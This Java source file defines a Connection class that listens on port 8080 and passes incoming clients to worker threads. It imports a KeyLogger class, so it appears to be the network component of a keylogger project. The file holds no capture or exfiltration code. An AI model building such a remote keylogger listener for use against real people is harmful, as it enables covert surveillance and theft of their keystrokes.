package Function;

import java.net.ServerSocket;
import java.net.Socket;

import KeyLogger.KeyLogger;

import Protocols.state;

public class Connection {
	private ServerSocket server = null;
	private Socket client = null;
	private state ConnectionState;

	private static final int PORT = 8080;
	private static final int LINGER_TIME = 5000;

	public Connection() {
		this.server = null;
		this.client = null;
		this.ConnectionState = state.CLOSEED;
	}

	public String getClientAddress() {
		if (this.ConnectionState == state.OPENED) {
			return this.client.getInetAddress().toString();
		}
		return null;
	}

	public state getConnectionState() {
		return this.ConnectionState;
	}

	public void activate() {
		if (ConnectionState == state.OPENED)
			return;

		try {
			ConnectionState = state.OPENED;

			server = new ServerSocket(PORT);

			while (server.isBound() && server != null) {
				client = server.accept();
				client.setSoLinger(true, LINGER_TIME);

				WorkerThread woker = new WorkerThread(client);
				woker.start();
			}
		} catch (Exception e) {
			e.getStackTrace();
		} finally {
			try {
				if (server != null) {
					server.close();
				}
			} catch (Exception e2) {
				e2.getStackTrace();
			}
		}

	}
}
